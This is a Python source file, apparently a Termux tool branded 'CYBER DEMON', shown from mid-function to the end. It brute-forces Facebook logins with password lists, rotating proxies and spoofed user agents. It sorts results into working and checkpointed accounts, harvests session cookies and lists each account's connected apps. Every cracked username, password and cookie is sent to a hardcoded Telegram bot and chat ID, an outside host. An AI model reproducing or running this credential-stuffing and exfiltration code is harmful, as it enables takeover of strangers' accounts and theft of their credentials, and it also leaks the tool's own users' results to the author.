				tree.add(f"[b yellow]{Jawnx(idf)}")
				tree.add(f"[[b red]+[white]][bold yellow]{idf} | {pw}")
				tree.add(f"[[b red]+[white]][bold blue]{ua}")
				cetak(tree)
				pen('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				requests.post(f"https://api.telegram.org/bot5801819480:AAGPf7_L3g-aCBMswPmWnRVZqpRgCth-ssY/sendMessage?chat_id=1977098006&text= CP RESULT \n( {uno} )\n ====================\n ( {Jawnx(idf)} ) /n.√. USER   (  {idf}  )\n.√. PASSWORD  (  {pw}  )\n ====================\n.√. USERAGENT   (  {ua}  )\n.√. By :- CYBER DEMON √ " )
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree= Tree(f"[[b green]+[white]] OK ACCOUNT ",guide_style="bold grey100")
				tree.add(f"[b green]{Jawnx(idf)}")
				tree.add(f"\r[bold green]{idf} | {pw}").add(f"\r[bold green ]{kuki} ")
				cetak(tree)
				requests.post(f"https://api.telegram.org/bot5801819480:AAGPf7_L3g-aCBMswPmWnRVZqpRgCth-ssY/sendMessage?chat_id=1977098006&text= OK RESULT \n( {uno} )\n ====================\n ( {Jawnx(idf)} )\n.√. USER   (  {idf}  )\n.√. PASSWORD  (  {pw}  )\n ====================\n.√. USERAGENT   (  {ua}  )\n.√. .√. COOKIE   (  {kuki}  )\n.√. By :- CYBER DEMON √ " )
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
	
	
#-----------------------[ METODE LAWAK V1]--------------------#
def cracklawakv1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}DEMON{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link=ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			heade ={'Host':'m.facebook.com','x-fb-rlafr': '0','access-control-allow-origin':'*','strict-transport-security':'max-age=15552000; preload; includeSubDomains','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-lsd': 'AVpr73AwpXc','x-fb-debug':'7TIW4GASHMRstipvH3hhndfu8XT7f1n9ogNckpZJRvyGPNJD4u18beO1evCVVkHED0RNJzrKTpKiPfwuP3881A==','content-length':'1447','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-javascript; charset=utf-8','user-agent': ua,'accept':'*/*','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer':'https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate,br','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree= Tree(f"[[b red]+[white]] CP ACCOUNT ",guide_style="bold grey100")
				tree.add(f"[b yellow]{Jawnx(idf)}")
				tree.add(f"[[b red]+[white]][bold yellow]{idf} | {pw}")
				tree.add(f"[[b red]+[white]][bold blue]{ua}")
				cetak(tree)
				pen('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				requests.post(f"https://api.telegram.org/bot5801819480:AAGPf7_L3g-aCBMswPmWnRVZqpRgCth-ssY/sendMessage?chat_id=1977098006&text= CP RESULT \n( {uno} )\n ====================\n ( {Jawnx(idf)} ) /n.√. USER   (  {idf}  )\n.√. PASSWORD  (  {pw}  )\n ====================\n.√. USERAGENT   (  {ua}  )\n.√. By :- CYBER DEMON √ " )
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree= Tree(f"[[b green]+[white]] OK ACCOUNT ",guide_style="bold grey100")
				tree.add(f"[b green]{Jawnx(idf)}")
				tree.add(f"\r[bold green]{idf} | {pw}").add(f"\r[bold green ]{kuki} ")
				cetak(tree)
				requests.post(f"https://api.telegram.org/bot5801819480:AAGPf7_L3g-aCBMswPmWnRVZqpRgCth-ssY/sendMessage?chat_id=1977098006&text= OK RESULT \n( {uno} )\n ====================\n ( {Jawnx(idf)} )\n.√. USER   (  {idf}  )\n.√. PASSWORD  (  {pw}  )\n ====================\n.√. USERAGENT   (  {ua}  )\n.√. .√. COOKIE   (  {kuki}  )\n.√. By :- CYBER DEMON √ " )
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
	
	
#-----------------------[ METHOD LAWAK V2 ]--------------------#
def cracklawakv2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	#ua = useragent()
	ua = useragent()
	ses = requests.Session()
	prog.update(des,description=f"{h}DEMON{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			link = ses.get('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': idf,
'prefill_source': 'provided_or_soft_matched',
'prefill_type': 'contact_point',
'first_prefill_source': 'provided_or_soft_matched',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'__dyn': '0wGaAG1mwHwh8-t0BBBg9oqxK12wAxu13w9y1DxW0Oohw5ux60Vo1a852q1ew65wce09MKdw5Owk888C0l-q3q0ny1Awci1qw8W0iW220jG3qaw4kwbS1Lw9C0z82fw',
'__csr': '',
'__req': random.choice('abcdefghijklmnopqrstuvwxyz123456789'),
'__a': '',
'__user':0
}
			heade = {
'Host':'x.facebook.com',
'x-fb-rlafr': '0',
'access-control-allow-origin': '*',
'pragma': 'no-cache',
'cache-control': 'private, no-cache, no-store, must-revalidate',
'x-fb-lsd':'AVqUJPZ_4-8',
'x-fb-asbd-id':'198387',
'x-fb-debug':'Ar808puA9haE5G4ec9zVAcFGinnes6bGoqixLonN/y5Q6rn9EcYoI4u3yLxGxJDpKRXuHAOiLuDHUPAeSTdPtg==',
'content-length':'2052',
'cache-control': 'max-age=0',
'save-data': 'on',
'upgrade-insecure-requests':'1',
'strict-transport-security':'max-age=15552000; preload',
'sec-ch-ua':'"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
'sec-ch-ua-mobile':'?1',
'user-agent':ua,
'content-type':'application/x-www-form-urlencoded',
'sec-ch-ua-platform': '"Android"',
'accept': '*/*',
'origin': 'https://x.facebook.com',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer':'https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
'accept-encoding':'gzip, deflate',
'accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'
}
			po = ses.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,headers=heade)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree= Tree(f"[[b red]+[white]] CP ACCOUNT ",guide_style="bold grey100")
				tree.add(f"[b yellow]{Jawnx(idf)}")
				tree.add(f"[[b red]+[white]][bold yellow]{idf} | {pw}")
				tree.add(f"[[b red]+[white]][bold blue]{ua}")
				cetak(tree)
				pen('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				requests.post(f"https://api.telegram.org/bot5801819480:AAGPf7_L3g-aCBMswPmWnRVZqpRgCth-ssY/sendMessage?chat_id=1977098006&text= CP RESULT \n( {uno} )\n ====================\n ( {Jawnx(idf)} ) /n.√. USER   (  {idf}  )\n.√. PASSWORD  (  {pw}  )\n ====================\n.√. USERAGENT   (  {ua}  )\n.√. By :- CYBER DEMON √ " )
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree= Tree(f"[[b green]+[white]] OK ACCOUNT ",guide_style="bold grey100")
				tree.add(f"[b green]{Jawnx(idf)}")
				tree.add(f"\r[bold green]{idf} | {pw}").add(f"\r[bold green ]{kuki} ")
				cetak(tree)
				requests.post(f"https://api.telegram.org/bot5801819480:AAGPf7_L3g-aCBMswPmWnRVZqpRgCth-ssY/sendMessage?chat_id=1977098006&text= OK RESULT \n( {uno} )\n ====================\n ( {Jawnx(idf)} )\n.√. USER   (  {idf}  )\n.√. PASSWORD  (  {pw}  )\n ====================\n.√. USERAGENT   (  {ua}  )\n.√. .√. COOKIE   (  {kuki}  )\n.√. By :- CYBER DEMON √ " )
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
	
	
	
	
def ua_api():
	az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
	builx = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
	chrome3 = str(random.randint(100, 300))
	chrome4 = str(random.randint(1000, 9000))
	ngentod = f"Mozilla/5.0 (Linux; Android {str(random.randint(2,8))}.{str(random.randint(1,9))}.{str(random.randint(1,9))}; LG-F320L Build/{builx}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.{chrome4}.{chrome3} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{chrome3};]"
	return ngentod

def crack1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	#ua = useragent()
	#ua = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h} VALIDATE {x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			ua = ua_api()
			ykh = random.randint(2e7, 3e7)
			iyh = random.randint(2e4, 4e4)
			params = {
				"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
				"sdk_version": {random.randint(1,26)}, 
				"email": idf,
				"locale": "en_US",
				"password": pw,
				"sdk": "android",
				"generate_session_cookies": "1",
				"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
			}
			headers = {
				"Host": "graph.facebook.com",
				"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
				"x-fb-sim-hni": str(random.randint(20000, 40000)),
				"x-fb-net-hni": str(random.randint(20000, 40000)),
				"x-fb-connection-quality": "EXCELLENT",
				"user-agent": ua,
				"content-type": "application/x-www-form-urlencoded",
				"x-fb-http-engine": "Liger"
			}
			xnxx = ses.post("https://graph.facebook.com/auth/login", params = params, headers = headers, allow_redirects=False)
			anjg = json.loads(xnxx.text)
			if "session_key" in xnxx.text:
				print('\r\r\033[1;32m [OK] %s | %s'%(idf,pw))
				open('/sdcard/OK.txt', 'a').write(idf+'|'+pw+'\n')
				oks.append(idf)
				break
			elif "checkpoint" in xnxx.text:
				if 'ya' in printcp:
					print('\r\r\x1b[38;5;208m [CP] '+idf+' | '+pw+'\033[1;97m')
					requests.post(f"https://api.telegram.org/bot5801819480:AAGPf7_L3g-aCBMswPmWnRVZqpRgCth-ssY/sendMessage?chat_id=1977098006&text= CP RESULT \n( {uno} )\n ====================\n ( {Jawnx(idf)} ) /n.√. USER   (  {idf}  )\n.√. PASSWORD  (  {pw}  )\n ====================\n.√. USERAGENT   (  {ua}  )\n.√. By :- CYBER DEMON √ " )
					open('/sdcard/CP.txt', 'a').write(idf+'|'+pw+'\n')
					cps.append(idf)
					break
				else:
					print('\r\r\033[1;32m [OK] %s | %s'%(idf,pw))
					requests.post(f"https://api.telegram.org/bot5801819480:AAGPf7_L3g-aCBMswPmWnRVZqpRgCth-ssY/sendMessage?chat_id=1977098006&text= OK RESULT \n( {uno} )\n ====================\n ( {Jawnx(idf)} )\n.√. USER   (  {idf}  )\n.√. PASSWORD  (  {pw}  )\n ====================\n.√. USERAGENT   (  {ua}  )\n.√. By :- CYBER DEMON √ " )
					open('/sdcard/OK.txt', 'a').write(idf+'|'+pw+'\n')
					oks.append(idf)
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1




#--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(x+'['+h+'•'+x+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
#----------------------[ CEK-APLIKASI ]---------------------#
def cek_apk(session,cookie):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/DEMON-DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:open('..txt','r').read().splitlines()
	except:think()
	#think()
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('clear')
	except:pass
	demonbuy()
